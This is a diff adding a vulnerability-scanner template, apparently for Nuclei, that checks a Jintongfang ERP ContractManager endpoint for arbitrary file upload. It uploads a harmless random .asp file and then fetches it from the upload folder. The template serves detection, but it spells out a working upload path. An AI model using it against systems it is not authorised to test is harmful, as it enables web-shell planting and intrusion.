@@ -1,0 +1,58 @@
+id: jintongfang-erp-contractmanager-anyfile-upload
+info:
+  name: ContractManager Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload, erp
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Page/ContractManager/ashx/Handler.ashx"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |-
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.asp"
+
+      {{t2}}
+      --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".asp"
+        part: body
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        part: body
+        regex:
+          - "(?P<file>[a-zA-Z0-9]+)\\.asp"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UploadBaseFolder/Contact/{{file}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
